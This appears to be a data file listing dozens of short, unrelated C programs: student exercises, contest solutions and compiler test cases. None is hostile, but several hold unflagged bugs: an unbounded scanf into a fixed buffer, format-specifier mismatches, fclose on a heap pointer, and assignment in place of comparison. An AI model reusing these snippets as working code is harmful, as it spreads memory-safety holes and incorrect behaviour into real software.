    "extern void abort (void);\ntypedef long long s64int;\ntypedef int s32int;\ntypedef unsigned long long u64int;\ntypedef unsigned int u32int;\ns64int\nanddi_di_notdi (s64int a, s64int b)\n{\n  return (a & ~b);\n}\ns64int\nanddi_di_notzesidi (s64int a, u32int b)\n{\n  return (a & ~(u64int) b);\n}\ns64int\nanddi_notdi_zesidi (s64int a, u32int b)\n{\n  return (~a & (u64int) b);\n}\ns64int\nanddi_di_notsesidi (s64int a, s32int b)\n{\n  return (a & ~(s64int) b);\n}\nint main ()\n{\n  s64int a64 = 0xdeadbeef0000ffffll;\n  s64int b64 = 0x000000005f470112ll;\n  s64int c64 = 0xdeadbeef300f0000ll;\n  u32int c32 = 0x01124f4f;\n  s32int d32 = 0xabbaface;\n  s64int z = anddi_di_notdi (c64, b64);\n  if (z != 0xdeadbeef20080000ll)\n    abort ();\n  z = anddi_di_notzesidi (a64, c32);\n  if (z != 0xdeadbeef0000b0b0ll)\n    abort ();\n  z = anddi_notdi_zesidi (c64, c32);\n  if (z != 0x0000000001104f4fll)\n    abort ();\n  z = anddi_di_notsesidi (a64, d32);\n  if (z != 0x0000000000000531ll)\n    abort ();\n  return 0;\n}",
    "#include <stdio.h>\n\nunsigned long bitsReverse64(unsigned long n) {\n    n = (((n) >> (32)) & (0x00000000FFFFFFFFUL)) | (((n) & (0x00000000FFFFFFFFUL)) << (32));;\n    n = (((n) >> (16)) & (0x0000FFFF0000FFFFUL)) | (((n) & (0x0000FFFF0000FFFFUL)) << (16));;\n    n = (((n) >> (8)) & (0x00FF00FF00FF00FFUL)) | (((n) & (0x00FF00FF00FF00FFUL)) << (8));;\n    n = (((n) >> (4)) & (0x0F0F0F0F0F0F0F0FUL)) | (((n) & (0x0F0F0F0F0F0F0F0FUL)) << (4));;\n    n = (((n) >> (2)) & (0x3333333333333333UL)) | (((n) & (0x3333333333333333UL)) << (2));;\n    n = (((n) >> (1)) & (0x5555555555555555UL)) | (((n) & (0x5555555555555555UL)) << (1));;\n    return n;\n}\nunsigned long popcount64(unsigned long n) {\n    n -= (n >> 1) & 0x5555555555555555UL;\n    n = (n & 0x3333333333333333UL) + ((n >> 2) & 0x3333333333333333UL);\n    return (((n + (n >> 4)) & 0xF0F0F0F0F0F0F0FUL) * 0x101010101010101UL) >> 56;\n}\nlong F0(long n) {\n    return (((1L << ((n + 2) / 2)) + (1L << n) * (2 * n + 1)) >> 2) - !!n;\n}\nlong F1(long n, long i, long j) {\n    long k, X = (1L << (n - i - 2)) * (n + 1) + (1L << (n - 2 * i - 4));\n    if (n & 1) {\n        X += (1L << ((n - 1) / 2 - i)) - (1L << ((n + 1) / 2));\n        for (k = 0; j; k++, j >>= 1)\n            if (j & 1) X += (1L << (n - 2 * i + k - 2)) + (1L << ((n - 1) / 2 - k));\n    } else {\n        X += (1L << ((n - 4) / 2 - i)) * (3 - n) + (1L << ((n - 2) / 2)) * (n - 2 * i - 4);\n        for (k = 0; j; k++, j >>= 1)\n            if (j & 1) X += (1L << (n - 2 * i + k - 2)) + (1L << ((n - 4) / 2 - k)) * (2 * (i - k + 2) - n);\n    }\n    return X >> 1;\n}\nint main(void) {\n    long n, i, j, d, X, D, P, Q;\n    scanf(\"%ld\", &n);\n    for (i = n, D = 1; i >>= 1; D++);\n    X = F0(D - 1);\n    P = D < 4 ? -1 : (D - 4) / 2;\n    Q = n & (~((1L << (D - P - 2)) - 1));\n    for (i = 0; i <= P; i++) {\n        if ((n >> (D - 2 - i)) & 1) {\n            j = (n >> (D - i - 1)) & ((1L << i) - 1);\n            X += F1(D , i, j);\n        }\n    }\n    d = 64 - D;\n    for (i = Q; i <= n; i++)\n        X += popcount64(i + (bitsReverse64(i) >> d));\n    printf(\"%ld\\n\", X);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int s[12]={4,7,47,74,444,447,474,477,744,747,774,777};\n    int n,i,c=0;\n    scanf(\"%d\",&n);\n    for(i=0;i<12;i++)\n    {\n        if(n%s[i]==0)\n        {\n            c=1;\n        }\n    }\n    if(c==1)\n    {\n        printf(\"YES\\n\");\n    }\n    else{\n        printf(\"NO\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nvoid read_data(const char *prompt, const char *format_tag, void *p)\n{\n    printf(\"%s\", prompt);\n    scanf(format_tag, p);\n}\nvoid print_intp(int *ptr)\n{\n    printf(\"%p -> %d\\n\", ptr, *ptr);\n}\nint main()\n{\n    int i, j;\n    float x;\n    int *p;\n    int *ptrs[] = { &i, &j };\n    read_data(\"Enter a value for i:\", \"%d\", &i);\n    read_data(\"Enter a value for j:\", \"%d\", &j);\n    read_data(\"Enter a value for x:\", \"%f\", &x);\n    p = &i;\n    print_intp(p);\n    print_intp(&i);\n    print_intp(&j);\n    print_intp(ptrs[1]);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int i,in=0;\n    float a,sum=0;\n    for(i=0; i<6; i++)\n    {\n        scanf(\"%f\",&a);\n        if(a>0)\n        {\n            sum=sum+a;\n            in++;\n        }\n    }\n    printf(\"%d valores positivos\\n\",in);\n    printf(\"%.1f\\n\",sum/in);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(int argc, char const *argv[])\n{\n    char nombre[50];\n    int edad;\n    double altura;\n    printf(\"Ingresa nombre: \");\n    fgets(nombre, 50, (stdin));\n    nombre[strlen(nombre) - 1] = '\\0';\n    printf(\"Ingresa edad: \");\n    scanf(\"%d\", &edad);\n    printf(\"Ingresa altura: \");\n    scanf(\"%lf\", &altura);\n    printf(\"Hola %s. Tu edad es %d y tu altura es %.3lf\", nombre, edad, altura);\n    return 0;\n}",
    "#include <stdio.h>\nlong filesize(FILE *f) {\n  long pos, size;\n  pos = ftell(f);\n  fseek(f, 0, 2);\n  size = ftell(f);\n  fseek(f, pos, 0);\n  return size;\n}\nint main(void) {\n  FILE *f = fopen(\"test.gif\", \"rb\");\n  FILE *st = fdopen(fileno((stdout)), \"wb\");\n  fprintf(st, \"Pragma: no-cache\\r\\n\");\n  fprintf(st, \"Content-type: image/gif\\r\\n\");\n  fprintf(st, \"Content-length: %d\\r\\n\", filesize(f));\n  fprintf(st, \"\\r\\n\");\n  while (1) {\n    char s[4000+1];\n    int size = fread(s, 1, 4000, f);\n    if (!size) break;\n    fwrite(s, size, 1, st);\n  }\n}",
    "#include <stdio.h>\nvoid swap(int a, int b);\nvoid swap_addr(int *a, int *b);\nvoid changeArray(int *ptr);\nint main()\n{\n int arr2[3] = {10, 20, 30};\n changeArray(&arr2[0]);\n for(int i=0; i<3 ; i++){\n  printf(\"%d\\n\", arr2[i]);\n }\n return 0;\n}\nvoid swap(int a, int b)\n{\n printf(\"(Swap \ud568\uc218 \ub0b4)a\uc758 \uc8fc\uc18c : %d\\n\", &a);\n printf(\"(Swap \ud568\uc218 \ub0b4)b\uc758 \uc8fc\uc18c : %d\\n\", &b);\n int temp = a;\n a = b;\n b = temp;\n printf(\"Swap \ud568\uc218 \ub0b4 -> a : %d, b : %d\\n\", a, b);\n}\nvoid swap_addr(int *a, int *b)\n{\n int temp = *a;\n *a = *b;\n *b = temp;\n printf(\"(\uc8fc\uc18c\uac12 \uc804\ub2ec)Swap \ud568\uc218 \ub0b4 -> a : %d, b : %d\\n\", *a, *b);\n}\nvoid changeArray(int *ptr)\n{\n ptr[2] = 50;\n}",
    "#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\nint GetInput(int *integers, int *counter, int *bufferlen);\nvoid AddIntegers(int *integers, int *counter, int *bufferlen);\nint ComputeMax(int *bufferlen);\nint main(){\n  int counter = 0;\n  int size = 21;\n  int integers[size];\n  int bufferlen = 8;\n  int flag = 0;\n  while (flag != (-1)){\n    if (counter > size - 1){\n      printf(\"Sorry.Storage limit reached!\\n\");\n      break;\n    }\n    flag = GetInput(integers, &counter, &bufferlen);\n  }\n  AddIntegers(integers, &counter, &bufferlen);\n  return 0;\n}\nint GetInput(int *integers, int *counter, int *bufferlen){\n  char input[*bufferlen + 10];\n  puts(\"Enter an integer:\");\n  int flag = scanf(\"%19s\", input);\n  if (flag == (-1)){\n    return flag;\n  }\n  else{\n    int val = atoi(input);\n    if (strlen(input) > *bufferlen - 1 ){\n      printf(\"The number you entered is too big! \\n\");\n    }\n    else if(val == 0 && input[0] != '0'){\n      printf(\"Invalid input! \\n\");\n    }\n    else{\n      integers[*counter] = val;\n      *counter += 1;\n    }\n    return flag;\n  }\n}\nvoid AddIntegers(int *integers, int *counter, int *bufferlen){\n  int sum = 0;\n  int max = ComputeMax(bufferlen);\n  for (int i = 0; i < (*counter); i++){\n    sum += integers[i];\n  }\n  if (sum <= max){\n    printf(\"The sum of all integers is %d \\n\", sum);\n  }\n  else{\n    printf(\"Sum exceeds largest integer can be represented!\\n\");\n  }\n}\nint ComputeMax(int *bufferlen){\n  int max = 1;\n  for (int i = 0; i < *bufferlen - 1; i++){\n    max = max * 10;\n  }\n  return max;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main(void)\n{\n system(\"color 0a\");\n system(\"mode 45, 10\");\n srand(time(((void*)0)));\n int counter = 0, min = 1, max = 50, ans = rand() % (max - min + 1) + min, guess;\nguessing:\n if (counter == 5)\n {\n  system(\"cls\");\n  printf(\"Failure!\\nYou are out of chance!\\nThe correct number is %d\", ans);\n  system(\"pause > nul\");\n  goto end;\n }\n system(\"cls\");\n printf(\"Guess a number from %d to %d(Chance: %d of 5)\\n\", min, max, counter + 1);\n scanf(\"%d\", &guess);\n if (guess == ans)\n {\n  printf(\"Congratulations!\\nYou guess the correct number!\\n===Press Any Key to Continue===\");\n  system(\"pause > nul\");\n }\n else if (guess > ans)\n {\n  printf(\"This number is too far to the answer!\\nMaybe you need to guess a small one.\\nYou have %d chance left!\\n===Press Any Key to Continue===\", 4 - counter);\n  max = guess;\n  counter ++;\n  system(\"pause > nul\");\n  goto guessing;\n }\n else\n {\n  printf(\"This number is too far to the answer!\\nMaybe you need to guess a big one.\\nYou have %d chance left!\\n===Press Any Key to Continue===\", 4 - counter);\n  min = guess;\n  counter ++;\n  system(\"pause > nul\");\n  goto guessing;\n }\nend:\n system(\"exit\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid hanoi(int n,char a,char b,char c){\n if(n==1){\n  printf(\"move disk %d from %c to %c\\n\",n,a,c);\n }else{\n  hanoi(n-1,a,c,b);\n  printf(\"move disk %d from %c to %c\\n\",n,a,c);\n  hanoi(n-1,b,a,c);\n }\n}\nint main(void){\n int n=4;\n char a='A',b='B',c='C';\n hanoi(n,a,b,c);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int array[10],n,i,j,swap;\n    printf(\"Enter the elements' number\");\n    scanf(\"%d\",&n);\n    printf(\"Enter %d integers\\n\",n);\n    for(i=0;i<n;i++)\n    {\n        scanf(\"%d\",&array[i]);\n    }\n    for(i=0;i<n-1;i++)\n    {\n        for(j=0;j<n-i-1;j++)\n        {\n            if(array[j]>array[j+1])\n            {\n                swap=array[j];\n                array[j]=array[j+1];\n                array[j+1]=swap;\n            }\n        }\n    }\n    printf(\"Sorted array\\n\");\n    for(i=0;i<n;i++)\n    {\n        printf(\"%d\\n\", array[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint a, b, c, d, e, f, g, h;\nint main() {\n    a = 1;\n    b = 65;\n    c = b;\n    if (a) goto L1;\n    goto L2;\nL1: b *= 100;\n    b -= -100000;\n    c = b;\n    c -= -17000;\nL2: f = 1;\n    d = 2;\nL5: e = 2;\nL4: g = d;\n    g *= e;\n    g -= b;\n    if (g) goto L3;\n    f = 0;\nL3: e -= -1;\n    g = e;\n    g -= b;\n    if (g) goto L4;\n    d -= -1;\n    g = d;\n    g -= b;\n    if (g) goto L5;\n    if (f) goto L6;\n    h -= -1;\nL6: g = b;\n    g -= c;\n    if (g) goto L7;\n    goto END;\nL7: b -= -17;\n    goto L2;\nEND:\n    printf(\"h: %d\\n\", h);\n}",
    "#include <stdio.h>\nint search (int key, int a[], int length);\nint main(void) {\n int a[] = {2,4,6,7,1,3,5,9,11,13,23,14,32};\n int x;\n int loc;\n printf(\"Input a number:\");\n scanf(\"%d\", &x);\n loc = search(x, a, sizeof(a)/sizeof(a[0]));\n if ( loc != -1) {\n  printf(\"%d in the No.%d\\n\", x, loc);\n } else {\n  printf(\"There is no %d\\n\", x);\n }\n return 0;\n}\nint search(int key, int a[] ,int length) {\n int ret = -1;\n int i;\n for ( i=0; i<length; i++ ) {\n  if ( a[i] == key ) {\n   ret = i;\n   break;\n  }\n }\n return ret;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid vassume(int b){}\nvoid vtrace1(int x, int y, int a, int b, int p, int q){}\nvoid vtrace2(int x, int y, int a, int b, int p, int q){}\nint mainQ(int x, int y){\n    vassume(x>=1);\n    vassume(y>=1);\n    int a,b,p,q;\n    a = x;\n    b = y;\n    p = 1;\n    q = 0;\n    while(1) {\n vtrace1(x, y, a, b, p, q);\n if(!(a!=0 && b!=0)) break;\n if (a % 2 ==0 && b % 2 ==0 ){\n     a = a/2;\n     b = b/2;\n     p = 4*p;\n }\n else if (a % 2 ==1 && b % 2 ==0 ){\n     a = a-1;\n     q = q+b*p;\n }\n else if (a % 2 ==0 && b % 2 ==1 ){\n     b = b-1;\n     q = q+a*p;\n }\n else {\n     a = a-1;\n     b = b-1;\n     q = q+(a+b+1)*p;\n }\n    }\n    vtrace2(x, y, a, b, p, q);\n    return q;\n}\nvoid main(int argc, char **argv){\n    mainQ(atoi(argv[1]), atoi(argv[2]));\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint main() {\n        int t;\n        scanf(\"%d\",&t);\n        for (int i=0; i < t; i++){\n            int flag = 0;\n            int num;\n            scanf(\"%d\", &num);\n            if (num < 2){\n                printf(\"Not prime\\n\");\n            }\n            else\n            {\n                for (int j=2; j <= sqrt(num); j++){\n                    if (num%j == 0){\n                        flag =1;\n                        break;\n                    }\n                }\n                if (flag == 0){\n                   printf(\"Prime\\n\");\n                }\n                else {\n                   printf(\"Not prime\\n\");\n                }\n            }\n        }\n    return 0;\n}",
    "int main (void) {\n  return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include <math.h>\nint main(){\n    float height, weight;\n    printf(\"Please input your height (cm):\\n\");\n    scanf(\"%f\", &height);\n    printf(\"Please input your weight (kg):\\n\");\n    scanf(\"%f\", &weight);\n    printf(\"Your BMI is %.3f.\",weight / pow(height / 100, 2));\n    return 0;\n}",
    "#include <stdio.h>\nint strend(char *, char *);\nint main()\n{\n char s[] = \"Helloworld\", t[] = \"world\";\n int i;\n i = strend(s, t);\n printf(\"w1 %s w2 %s res %d\\n\", s, t, i);\n return 0;\n}\nint strend(char *s, char *t)\n{\n char *ts = t;\n while (*s != '\\0')\n {\n  s++;\n }\n while (*t != '\\0')\n {\n  t++;\n }\n for (s--, t--; *s == *t; s--, t--)\n  ;\n if (++t == ts)\n {\n  return 1;\n }\n else\n {\n  return 0;\n }\n}",
    "#include <stdio.h>\nint main()\n{\n    int A = 0, C, G=0,H=0,I=0,J=0;\n    for (C = 1; C <= 5; C++)\n    {\n        scanf(\"%d\", &A);\n        if (A%2 == 0)\n        {\n            G++;\n        }\n        if(A%2 != 0){\n            H++;\n        }\n        if(A > 0 ){\n            I++;\n        }\n        if(A < 0 ){\n            J++;\n        }\n    }\n    printf(\"%d valor(es) par(es)\\n\", G);\n    printf(\"%d valor(es) impar(es)\\n\", H);\n    printf(\"%d valor(es) positivo(s)\\n\", I);\n    printf(\"%d valor(es) negativo(s)\\n\", J);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint marks_summation(int* marks, int n, char gender) {\n    int sum = 0;\n    if (gender == 'b')\n    {\n        for(int i=0; i<n; i+=2)\n        {\n            sum += marks[i];\n        }\n    }\n    else\n    {\n        for(int i=1; i<n; i+=2)\n        {\n            sum += marks[i];\n        }\n    }\n    return sum;\n}\nint main() {\n    int number_of_students;\n    char gender;\n    int sum;\n    scanf(\"%d\", &number_of_students);\n    int *marks = (int *) malloc(number_of_students * sizeof (int));\n    for (int student = 0; student < number_of_students; student++) {\n        scanf(\"%d\", (marks + student));\n    }\n    scanf(\" %c\", &gender);\n    sum = marks_summation(marks, number_of_students, gender);\n    printf(\"%d\", sum);\n    free(marks);\n    return 0;\n}",
    "#include<stdio.h>\nint a[1000]={0};\nint N(int l,int r,int n)\n{ int sum=0;\n for(int i=l;i<=r;i++)\n {\n  sum+=a[i];\n }\n return sum%n;\n}\nint M(int l,int r,int n)\n{\n long long cheng=1;\n for(int i=l;i<=r;i++)\n {\n  cheng*=(a[i]%n);\n  if(cheng>=200)\n  cheng%=n;\n }\n return cheng%n;\n}\nint H(int l,int r,int n)\n{\n int x=a[l];\n for(int i=l+1;i<=r;i++)\n {\n  x^=a[i];\n }\n return x;\n}\nint main()\n{\n int n,k;\n scanf(\"%d%d\",&n,&k);\n for(int i=0;i<n;i++)\n scanf(\"%d\",&a[i]);\n for(int i=1;i<=k;i++)\n {\n  int l,r;\n  scanf(\"%d%d\",&l,&r);\n  int n1=N(l,r,n);\n  int m1=M(l,r,n);\n  int a1=(n1<m1)?n1:m1;\n  int a2=(n1>m1)?n1:m1;\n  int ans=H(a1,a2,n);\n  printf(\"%d\\n\",ans);\n }\n return 0;\n}",
    "#include <unistd.h>\n#include <stdlib.h>\nint main (int argc, char **argv)\n{\n  int a = atoi(argv[1]);\n  usleep(a * 1000);\n  return 0;\n}",
    "#include<stdio.h>\nint x = 1;\nint y = 0;\nint a[3];\nint b[5][5];\nint main() {\n printf(\"%d\\n\", x);\n int z;\n a[0] = 1;\n a[1] = 5;\n b[1][1] = 2;\n b[a[1]][2] = 4;\n if (a[b[2][1]] > b[1][0] + 2)\n  z = 1;\n else\n  z = 2;\n x = 1;\n}",
    "static float tfcos12[3];\n__attribute__((noinline)) double f(double x) { return x; }\nint g;\nint main(void)\n{\n  int i, j;\n  for (i = 0; i < 1; i++)\n    tfcos12[i] = 0.5;\n  for (i = 0; i < 1; i++)\n    {\n      tfcos12[i] = 0.5 * f(i);\n      for (j = 0; j < 12; j++)\n g++;\n    }\n  return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n  char str[100];\n  scanf(\"%s\", str);\n  printf(\"hello %s\\n\", str);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int n;\n  printf(\"\\n Enter number to check to check Even or Odd: \");\n  scanf(\"%d\", &n);\n  if (n%2==0)\n  {\n    if (n==0)\n    printf(\"\\n %d is zero\", n);\n    else\n    printf(\"\\n %d is an even number\", n);\n  }\n  else\n  printf(\"\\n %d is an odd number\", n);\n  return 0;\n}",
    "#include<stdio.h>\nint partiton(int arr[], int low, int high) {\n    int pivot = arr[high];\n    int i = low - 1;\n    for(int j = low; j <= high-1;j++) {\n        if(arr[j] < pivot) {\n            i++;\n            int temp = arr[i];\n            arr[i] = arr[j];\n            arr[j] = temp;\n        }\n    }\n    int temp = arr[i + 1];\n    arr[i + 1] = arr[high];\n    arr[high] = temp;\n    return (i+1);\n}\nvoid quicksort(int arr[], int low, int high) {\n    if(low < high) {\n        int pi = partiton(arr, low, high);\n        quicksort(arr, low, pi-1);\n        quicksort(arr,pi+1, high);\n    }\n}\nint main() {\n    int n,arr[100];\n    printf(\"Enter number of elements: \");\n    scanf(\"%d\", &n);\n    printf(\"Enter %d elements now: \", n);\n    for(int i = 0; i < n; i++) {\n        scanf(\"%d\", &arr[i]);\n    }\n    printf(\"Before sort: \");\n    for(int i = 0; i < n; i++) {\n        printf(\"%d \", arr[i]);\n    }\n    quicksort(arr, 0, n-1);\n    printf(\"\\nAfter sort: \");\n    for(int i = 0; i < n; i++) {\n        printf(\"%d \", arr[i]);\n    }\n    printf(\"\\n\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\nsystem(\"cls\");\n    int *v;\n    int N = 0;\n            printf(\"Informe o tamanho do vetor.:\\n\");\n            scanf(\"%d\", &N);\n        v = (int *) malloc(N * sizeof(int));\n        if (v == ((void*)0)){\n            printf(\"Erro!\");\n            system(\"pause\");\n            exit(1);\n        }\n    printf(\"Preencha o vetor com [%d] posi\u00e7\u00f5es.\\n\", N);\n    setbuf((stdin), ((void*)0));\n            for( int i = 0; i < N; i++){\n                printf(\"vetor^[%d]=>:\", i);\n                scanf(\"%d\", &v[i]);\n            }\n            system(\"cls\");\n            for( int i = 0; i < N; i++){\n                printf(\"vetor^[%d]=>[%d].\\n\", i, v[i]);\n            }\n    int x = 0;\n    printf(\"Infore um valor para calcular os multiplos do vetor.:\\n:\");\n    scanf(\"%d\", &x);\n        for( int i = 0; i < N; i++){\n            if( x % v[i] == 0){\n                printf(\"vetor^[%d]=>[%d].\\n\", i, v[i]);\n            }\n        }\nfclose(v);\n       return 0 ;\n   }",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n  int N, i, cont=0;\n  int *H;\n  while (1) {\n    cont = 0;\n    scanf(\"%d\", &N);\n    if(!N)break;\n    H = (int *) malloc (N*sizeof(int));\n    for(i = 0; i<N; i++){\n      scanf(\"%d\", H+i);\n    }\n    for(i = 1; i < N-1; i++){\n      if((*(H+i) > *(H+i-1)) && (*(H+i) > *(H+i+1))){\n        cont++;\n      }\n      if((*(H+i) < *(H+i-1)) && (*(H+i) < *(H+i+1))){\n        cont++;\n      }\n      }\n      if((*(H+N-1) > *(H+N-2)) && (*(H+N-1) > *(H))){\n        cont++;\n      }\n      if((*(H+N-1) < *(H+N-2)) && (*(H+N-1) < *(H))){\n        cont++;\n      }\n      if((*(H) > *(H+N-1)) && (*(H) > *(H+1))){\n        cont++;\n      }\n      if((*(H) < *(H+N-1)) && (*(H) < *(H+1))){\n        cont++;\n      }\n    printf(\"%d\\n\", cont);\n    free(H);\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid fibonacci(int n,int m, int limit, int a){\n    if(n==0&&m==1){\n        printf(\"0, 1, \");\n    }\n    if(a==limit){\n        return;\n    }\n    printf(\"%i, \",m+n);\n    fibonacci(m,m+n,limit,a+1);\n}\nint main(){\n    int n;\n    printf(\"Ingresa el numero limite:\\n>\");\n    scanf(\"%i\",&n);\n    fibonacci(0,1,n,1);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    char buffer[80];\n    double x = 1234.5, y = 678.9, z = -753.1, a = x * y + z;\n    int output_len = 0;\n    output_len = snprintf( buffer, 80, \"For the input values %lf, %lf,\"\n                           \" and %lf,\\nthe result was %lf.\\n\",\n                           x, y, z, a );\n    puts( buffer );\n    if ( output_len >= 80 )\n       fprintf( (stderr), \"Output string truncated! Lost %d characters.\\n\",\n                output_len - 79 );\n    return 0;\n}",
    "#include<stdio.h>\n\nint main()\n{\n const double SCALE= 0.33;\n double shoe,foot;\n scanf(\"%d\",&shoe);\n foot=SCALE*shoe+7.31;\n printf(\"Shoe size (men's') foot length\\n\");\n printf(\"%15.2f inches\\n\",foot);\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    char cor[37] = \"0PVPPVPVVVPPVPVVVVPVPPVPVPPVPVPVPPVPV\";\n    int entrada;\n    printf(\"Qual \u00e9 o n\u00famero? \");\n    scanf(\"%i\", &entrada);\n    if (entrada < 0 || entrada > 36) {\n        printf(\"Valor inv\u00e1lido\");\n        return 0;\n    }\n    printf(\"\\nO n\u00famero \u00e9 %d, \u00e9 %s\", entrada, cor[entrada] == 'V' ? \"vermelho\" : cor[entrada] == 'P'\n                                                                 ? \"preto\" : \"verde\");\n    printf(\", %s\", entrada > 18 ? \"grande\" : \"pequeno\");\n    printf(\", %s\", entrada % 2 == 0 ? \"par\" : \"\u00edmpar\");\n}",
    "#include<stdio.h>\nint main() {\n int t,i,j,r;\n char s[10000],c;\n scanf(\"%d%*c\",&t);\n while(t--) {\n  for(i=0;(((c=getchar())!='\\n')&&(c!=(-1)));++i)\n   s[i]=c;\n  for(r=j=0;j<i/2;++j)\n   r+=(s[i-1-j]<s[j])?(s[j]-s[i-1-j]):(s[i-1-j]-s[j]);\n  printf(\"%d\\n\",r);\n }\n return 0;\n}",
    "#include <stdio.h>\nstatic long long a = 0;\nlong long b = 10;\nlong long c = 30;\nint main() {\n    a = b;\n    b = c;\n    c = a;\n    printf(\"%d\\n\", a);\n    printf(\"%d\\n\", b);\n    printf(\"%d\\n\", c);\n}",
    "#include <stdio.h>\nunsigned int X(unsigned long n1, unsigned long n2, unsigned long n3)\n{\n    return n1 ^ n2 ^ n3;\n}\nunsigned int power(unsigned int base, unsigned int exp)\n{\n    if (exp == 0) {\n        return 1;\n    }\n    else if (exp % 2) {\n        return base * power(base, exp - 1);\n    }\n    else {\n        unsigned int tmp = power(base, exp/2);\n        return tmp * tmp;\n    }\n}\nint main(int argc, char *argv[])\n{\n    unsigned long c = 0;\n    unsigned long n;\n    unsigned long upper_limit = power(2, 30) + 1;\n    for (n = 1; n < upper_limit; n++) {\n        if (X(n, 2*n, 3*n) == 0) {\n            c++;\n        }\n    }\n    printf(\"%lu\\n\", c);\n    return 0;\n}",
    "#include <stdio.h>\nint main (){\n    int data,dia,mes,ano;\n    printf(\"Qual a data formato [ddmmaaaa] \");\n    scanf(\"%d\",&data);\n    ano=data%10000;\n    data=data/10000;\n    mes=data%100;\n    data=data/100;\n    dia=data;\n    if((dia>31)||( dia=0)){\n        printf(\"data incorreta\");\n    }\n    if((mes>12)||( mes=0)){\n        printf(\"data incorreta\");\n    }\n    switch( mes ) {\n    case 1: printf(\"%d/janeiro/%d\",dia,ano) ; break;\n    case 2: printf(\"%d/fevereiro/%d\",dia,ano) ; break;\n    case 3: printf(\"%d/marco/%d\",dia,ano) ; break;\n    case 4: printf(\"%d/abril/%d\",dia,ano) ; break;\n    case 5: printf(\"%d/maio/%d\",dia,ano) ; break;\n    case 6: printf(\"%d/junho/%d\",dia,ano) ; break;\n    case 7: printf(\"%d/julho/%d\",dia,ano) ; break;\n    case 8: printf(\"%d/agosto/%d\",dia,ano) ; break;\n    case 9: printf(\"%d/setembro/%d\",dia,ano) ; break;\n    case 10: printf(\"%d/outubro/%d\",dia,ano) ; break;\n    case 11: printf(\"%d/novembro/%d\",dia,ano) ; break;\n    case 12: printf(\"%d/dezembro/%d\",dia,ano) ; break;\n}\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n float num;\n printf(\"Enter any float number\\n\");\n scanf(\"%f\", &num);\n printf(\"%f\\n\", num);\n printf(\"%.1f\\n\", num);\n printf(\"%.2f\\n\", num);\n printf(\"%.3f\\n\", num);\n printf(\"%.4f\\n\", num);\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nlong binetsSolution(void);\nconst double phi = 1.6180339887;\nint main(void) {\n printf(\"Sum of even fibonacci numbers below 4e+6\\n\");\n printf(\"using Binet's formula: %ld\\n\", binetsSolution());\n return 0;\n}\nlong binetsFormula(const int n) {\n return round((pow(phi, n) - (1/pow(-phi, n))) / (2*phi - 1));\n}\nlong binetsSolution(void) {\n int i = 2;\n long sum = 0;\n long fibnum = 0;\n while((fibnum = binetsFormula(i++)) < 4e+6) {\n  if(!(fibnum & 1)) {\n   sum += fibnum;\n  }\n }\n return sum;\n}",
    "#include <stdio.h>\n\n\n\nint main(int argc, char **argv){\n    int a, a_3, a_5, a_9;\n    scanf(\"%d\", &a);\n    (a_3 = 3*(a));\n    (a_5 = 5*(a));\n    (a_9 = 9*(a));\n    printf(\"%d\\n\", a_3);\n    printf(\"%d\\n\", a_5);\n    printf(\"%d\\n\", a_9);\n    return 0;\n}",
    "#include <stdio.h>\nint main () {\n int x, i, imp=1;\n scanf(\"%d\", &x);\n for (i=0; i <= x; i++) {\n  if (imp % 2 != 0)\n   printf(\"%d\\n\", imp);\n  imp++;\n }\n return 0;\n}",
    "#include <stdio.h>\nvoid foo() {}\nint main() {\n    puts(\"Hello world\");\n    foo();\n}",
    "#include<stdio.h>\n\nint main(void)\n{\n int c[100];\n int i,j;\n for(i=0;i<=100 -1;i++)\n {\n  c[i]=2*i+2;\n }\n printf(\"Number\\tValue\\n\");\n for(j=0;j<=100 -1;j++)\n {\n  printf(\"%d\\t%d\\n\",j,c[j]);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int number;\n    float tempNumber;\n    short divisor;\n    int root;\n    int remainder;\n    unsigned char numberOfDigits = 1;\n    unsigned char i = 0;\n    printf(\"Enter an integer that bigger than 10: \");\n    scanf(\"%d\", &number);\n    tempNumber = number;\n    if(number <= 10)\n    {\n        printf(\"Input error...\");\n        return 0;\n    }\n    while(tempNumber > 1)\n    {\n        tempNumber = tempNumber / 10;\n        numberOfDigits++;\n    }\n    while(1)\n    {\n        i++;\n        divisor = (numberOfDigits * numberOfDigits) * i;\n        root = (int)(number / divisor);\n        if((root * root) < number)\n        {\n            while(1)\n            {\n                root++;\n                if((root * root) > number)\n                {\n                    root--;\n                    remainder = number - (root * root);\n                    if(remainder == 0)\n                    {\n                        printf(\"\\n\\n\\tSquare root solution is %d = %d * %d \\n\\n\", number, root, root);\n                    }\n                    else\n                    {\n                        printf(\"\\n\\n\\tClosest square root solution is %d = %d * %d + %d \\n\\n\", number, root, root, remainder);\n                    }\n                    return 0;\n                }\n            }\n        }\n    }\n}",
